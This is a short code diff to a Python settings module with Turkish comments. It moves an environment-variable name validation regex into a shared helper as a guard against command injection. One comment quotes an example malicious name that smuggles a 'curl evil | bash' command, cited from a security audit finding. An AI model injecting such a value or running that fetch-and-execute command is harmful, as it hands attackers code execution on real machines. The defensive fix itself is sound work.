@@ -32,7 +32,7 @@ SETTINGS_JSON = os.path.join(CLAUDEOPS_DIR, "settings.json")
 # `{"FOO; curl evil | bash #": "1"}` gibi bir env_name göndermek komut
 # enjeksiyonu demekti (Antigravity SEC-02, en kritik bulgu). Gerçek env-var
 # isimleri zaten hep bu şekle uyar — kısıtlama hiçbir meşru kullanımı kırmaz.
-BYOK_ENV_NAME_RE = re.compile(r"^[A-Z_][A-Z0-9_]*$")
+from .envnames import ENV_NAME_RE as BYOK_ENV_NAME_RE, is_safe_env_name    # ortak tanım (leaf modül)
 
 DEFAULT_SETTINGS: Dict[str, Any] = {
     "theme": "system",       # "system" | "light" | "dark"
@@ -375,7 +375,7 @@ def _save_settings_locked(patch: Dict[str, Any]) -> Dict[str, Any]:
                     # Geçersiz bir isim (yukarıdaki BYOK_ENV_NAME_RE yorumuna
                     # bkz.) sessizce ATLANIR — save_settings'in geri kalanı gibi
                     # (bilinmeyen anahtar/tip toleransı) hata fırlatmak yerine.
-                    if not BYOK_ENV_NAME_RE.match(env_name):
+                    if not is_safe_env_name(env_name):
                         continue
                     target[env_name] = str(env_val)
                 if target:
